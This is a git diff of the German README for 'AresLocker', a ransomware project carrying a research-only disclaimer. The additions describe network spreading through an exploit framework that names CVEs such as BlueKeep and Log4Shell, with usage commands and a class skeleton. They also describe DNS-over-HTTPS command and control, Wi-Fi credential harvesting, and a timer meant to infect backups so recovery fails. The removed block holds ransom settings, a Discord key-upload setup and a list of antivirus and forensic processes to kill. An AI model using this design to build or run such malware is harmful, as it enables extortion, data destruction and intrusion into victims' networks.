@@ -1,4 +1,3 @@
-
 # Wichtiger rechtlicher Hinweis
 
 **Dieses Projekt dient ausschließlich Forschungs-, Analyse- und Testzwecken im Bereich der IT-Sicherheit. Jegliche Nutzung, Verbreitung oder Anwendung auf fremden Systemen ohne ausdrückliche und schriftliche Erlaubnis ist strengstens untersagt und kann straf- sowie zivilrechtliche Konsequenzen nach sich ziehen. Der Autor übernimmt keinerlei Haftung für Schäden, Datenverluste oder sonstige Folgen, die durch unsachgemäßen, fahrlässigen oder missbräuchlichen Einsatz entstehen. Die Verantwortung für die Einhaltung aller geltenden Gesetze und Vorschriften liegt ausschließlich beim Nutzer.**
@@ -59,6 +58,8 @@ Mehrere Methoden sorgen für Autostart und Selbstheilung:
 Zeitgesteuerter Ablauf über `trigger.bat`:
 - Überwachung eines vordefinierten Zeitpunkts (lokal oder via Zeitserver)
 - Verzögerung zur Erschwerung der Analyse möglich
+- Wen der Timer lang genug ist können damit Backups infiltiriert werden um     
+  wiederherstellung vollständig zu verhindern.
 - Bei Erreichen des Zeitpunkts:
   - Start der Hauptfunktion (`main.py`): Dateiverschlüsselung, Anzeige der Lösegeldforderung
   - Deaktivierung von Schutzmechanismen (`disalbe.py`): Registry, Dienste, Prozesse
@@ -91,8 +92,72 @@ Alle zentralen Einstellungen werden in `encryptor/arciv/config.py` über die Kla
 - Chunk-Größe, Pfade, Logdatei, Dateiendung
 - Upload-Retries, Ausschlussverzeichnisse
 
+### 6. Global Movement - Netzwerk-Verbreitung
+Das Global Movement Modul implementiert fortschrittliche Techniken zur Malware-Verbreitung über verschiedene Netzwerk-Protokolle und -Methoden.
 
+#### 6.1 DNS-over-HTTPS (DoH) mit WiFi-Integration
+**Dateien:**
+- `AresLocker/global_movement/doh_server.py` - DoH-Server mit integrierter WiFi-Funktionalität
+- `AresLocker/global_movement/doh_client.py` - DoH-Client mit integrierter WiFi-Funktionalität
+- `AresLocker/global_movement/doh_wifi_config.py` - Konfiguration für DoH-WiFi-Integration
 
+**Funktionen:**
+- DNS-over-HTTPS Command & Control
+- WLAN-Zugangsdaten-Sammlung und -Verbreitung
+- Automatische Netzwerk-Verbindung
+- Stealth-Kommunikation über DNS-Traffic
+
+#### 6.2 Exploit Framework
+**Dateien:**
+- `AresLocker/global_movement/exploits/base_exploit.py` - Abstrakte Basisklasse für alle Exploits
+- `AresLocker/global_movement/exploits/exploit_RAM_loader.py` - Dynamischer Exploit-Loader
+- `AresLocker/global_movement/main.py` - Hauptprogramm für Exploit-Verwaltung
+- `AresLocker/global_movement/exploits/` - Verschiedene Exploit-Kategorien (HTTP, SSH, RDP, etc.)
+
+**Funktionen:**
+- Standardisiertes Exploit-Framework
+- Dynamisches Laden und Ausführen von Exploits
+- Automatische Target-Verifikation und Payload-Generierung
+- Konsistente Logging- und Fehlerbehandlung
+- Session-Management und Statusverfolgung
+
+**Verfügbare Exploit-Kategorien:**
+- **HTTP Exploits:** CVE_2019_11510, CVE_2020_5902, CVE_2021_22986, etc.
+- **HTTPS Exploits:** CVE_2022_22965 (Spring4Shell), CVE-2023_34362, etc.
+- **SSH Exploits:** CVE_2016_0777, CVE_2018_15473, CVE_2023_38408
+- **RDP Exploits:** CVE_2019_0708 (BlueKeep), CVE_2020_0609, CVE_2024_49112
+- **Windows Core Exploits:** CVE_2021_44228 (Log4Shell), CVE_2022_34718, etc.
+- **Weitere Protokolle:** Redis, Apache Tomcat, etc.
+
+**Verwendung des BaseExploit Frameworks:**
+```python
+# Neuen Exploit erstellen
+class MeinExploit(BaseExploit):
+    def verify_target(self) -> bool:
+        # Target-Verifikation implementieren
+        pass
+    
+    def generate_payload(self) -> Any:
+        # Payload generieren
+        pass
+    
+    def execute(self) -> bool:
+        # Exploit ausführen
+        pass
+
+# Exploit verwenden
+exploit = MeinExploit("192.168.1.100", port=8080)
+success = exploit.run()
+```
+
+**Über das Hauptprogramm:**
+```bash
+# Alle verfügbaren Exploits anzeigen
+python AresLocker/global_movement/main.py --list
+
+# Exploit ausführen
+python AresLocker/global_movement/main.py --execute http CVE_2021_22986
+```
 
 ## Datei- und Verzeichnisstruktur
 
@@ -100,6 +165,11 @@ Alle zentralen Einstellungen werden in `encryptor/arciv/config.py` über die Kla
 - `AresLocker/encryptor/`: Weitere Komponenten (z.B. 7z.exe, extract.bat)
 - `AresLocker/keys/`: Schlüsseldateien (`private.pem`, `public.pem`)
 - `AresLocker/decryptor/`: Tools zur Entschlüsselung (bei vorhandenem Private Key)
+- `AresLocker/global_movement/`: Netzwerk-Verbreitung und Exploit-Framework
+  - `doh_server.py`, `doh_client.py`, `doh_wifi_config.py` - DoH WiFi Integration
+  - `exploits/` - Exploit-Framework mit verschiedenen Kategorien
+  - `main.py` - Exploit-Verwaltung
+  - `ip_scanner/` - Netzwerk-Scanning-Tools
 
 **Wichtige Dateien:**
 - `start.py`: Initialisierung, Rechteprüfung, Logging
@@ -123,78 +193,7 @@ Alle zentralen Einstellungen werden in `encryptor/arciv/config.py` über die Kla
    - Schutzmechanismen deaktivieren (`disalbe.py`)
    - Systemwiederherstellung verhindern
    - Netzwerkfreigaben und externe Laufwerke optional einbeziehen
-
-
-**Konfigurationen (aktualisiert):**
-Alle zentralen Einstellungen werden in `encryptor/arciv/config.py` über die Klasse `Config` vorgenommen. Wichtige Parameter sind:
-
-    # === Werte für die Lösegeldforderung ===
-    BTC_ADDRESS = "1A2b3C4d5E6f7G8h9I0jKLMNOPqrStUv"  # Bitcoin-Adresse
-    CONTACT_EMAIL = "unlock@fakedomain.to"            # Kontakt-E-Mail
-    COUNTDOWN_HOURS = 72                               # Countdown in Stunden
-    TIMER_FILE = "ransom_timer.txt"                   # Timer-Dateiname
-
-    # === Werte für den Upload des Keys auf Discord ===
-    TOKEN = "DEIN_DISCORD_BOT_TOKEN"  # Hier deinen Bot Token eintragen
-    CHANNEL_ID = 123456789012345678  # Hier die Ziel-Channel-ID eintragen
-    ENCRYPTED_KEY_FILENAME = "key.bin"  # Name der Schlüsseldatei
-    # === Werte für die Verschlüsselung ===
-    CHUNK_SIZE = 5 * 1024 * 1024                # Größe der Chunks beim Lesen großer Dateien (5 MB)
-    ECIES_PUBLIC_KEY_PATH = Path("public.pem")  # Pfad zum öffentlichen ECIES-Schlüssel
-    LOG_FILE = Path("encryption.log")         # Logdatei für den Verschlüsselungsprozess
-    ENCRYPTED_EXTENSION = ".areslock"         # Dateiendung für verschlüsselte Dateien
-    
-    # === Discord-Upload Einstellungen ===
-    MAX_RETRIES = 3                          # Maximale Anzahl von Upload-Versuchen
-    RETRY_DELAY = 2                          # Wartezeit zwischen Upload-Versuchen (Sekunden)
-
-    # === Prozesse die beendet werden sollen ===
-    TARGET_PROCESSES = [
-        # Systemtools
-        "Taskmgr.exe", "ProcessHacker.exe", "procexp.exe", "procexp64.exe", "perfmon.exe",
-        "msconfig.exe", "regedit.exe", "cmd.exe", "powershell.exe", "pwsh.exe",
-        "wmic.exe", "services.exe", "resmon.exe", "SystemSettings.exe",
-        "eventvwr.exe", "gpedit.msc", "mmc.exe", "dxdiag.exe", "verifier.exe",
-        "sigverif.exe", "tasklist.exe", "taskkill.exe",
-
-        # Sicherheits-/Antiviren-Tools
-        "MsMpEng.exe", "NortonSecurity.exe", "avp.exe", "avgui.exe", "avastui.exe",
-        "mcshield.exe", "ashDisp.exe", "bdagent.exe", "f-secure.exe", "savservice.exe",
-        "ekrn.exe", "cfp.exe", "zatray.exe", "mbam.exe", "mbamtray.exe", "wrsa.exe",
-        "SecHealthUI.exe", "ccSvcHst.exe", "egui.exe", "avguard.exe", "pav.exe",
-        "clamscan.exe", "trusteer.exe", "msmpengcp.exe", "sbiectrl.exe", "vsmon.exe",
-        "gdscan.exe", "v3svc.exe", "spysweeper.exe", "detectionengine.exe", "hipsservice.exe",
-        "cortexagent.exe", "carbonblack.exe",
-
-        # Debugging / Forensik / Analyse
-        "windbg.exe", "ollydbg.exe", "ida.exe", "ida64.exe", "ImmunityDebugger.exe",
-        "x64dbg.exe", "procmon.exe", "tcpview.exe", "wireshark.exe", "fiddler.exe",
-        "dumpcap.exe", "procdump.exe", "autoruns.exe", "accesschk.exe",
-        "osqueryd.exe", "velociraptor.exe",
-
-        # Netzwerktools & CLI
-        "netstat.exe", "ipconfig.exe", "ping.exe", "tracert.exe",
-        "nmap.exe", "curl.exe", "wget.exe"
-    ]
-
-    # === Verzeichnisse, die bei der Dateisuche ignoriert werden ===
-    EXCLUDED_DIRS = [
-        Path('C:\\Windows'),                  # Windows-Systemverzeichnis
-        Path('C:\\Program Files'),            # Programme
-        Path('C:\\Program Files (x86)'),      # 32-Bit-Programme
-        Path('C:\\System Volume Information'),# Systeminformationen
-        Path('C:\\$Recycle.Bin'),             # Papierkorb
-        Path('C:\\Users\\Default'),           # Default-User
-        Path('C:\\Users\\Public'),            # Öffentliche Benutzer
-        Path('C:\\ProgramData'),              # Programmdaten
-        Path('C:\\Recovery')                  # Recovery-Partition
-    ]
-
-    # === Werte für das Hauotprogramm ===
-    BITCOIN_URL = "https://www.bitcoin.com"  # Zahlungs-URL
-    NOTE_PROCESS_NAME = "note.exe"           # Name der Lösegeldforderung
-    NOTE_EXE_PATH = r"note.exe"              # Pfad zu Lösegeldforderung
-
+6. Optional: Global Movement - Netzwerk-Verbreitung über DoH und Exploits
 
 # Indikatoren einer Kompromittierung (IOCs)
 
@@ -229,6 +228,7 @@ Die folgenden Merkmale können auf eine Infektion mit AresLocker hindeuten:
 **Kontaktinformationen in der Lösegeldforderung:**
 - Bitcoin-Adresse: `1A2b3C4d5E6f7G8h9I0jKLMNOPqrStUv`
 - Kontakt-E-Mail: `unlock@fakedomain.to`
+
 
 **Weitere Hinweise:**
 - Dateien/Prozesse mit den o.g. Namen
